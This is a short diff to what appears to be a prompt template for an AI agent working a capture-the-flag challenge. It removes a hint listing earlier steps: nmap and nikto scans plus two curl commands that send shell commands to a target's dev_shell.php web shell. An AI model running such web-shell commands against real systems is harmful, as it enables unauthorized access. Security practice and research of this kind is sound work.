@@ -112,10 +112,3 @@ Environment context:
 % if artifacts:
 Some useful information: ${artifacts}
 % endif
-
-IMPORTANT: you already tried to solve this CTF challenge and you did this:
-- nmap to get the port
-- nikto to find interesting files
-- curl -d "in_command=whoami" IP/dev_shell.php
-- curl -d "in_command=/bin/ls /bin" IP/dev_shell.php
-
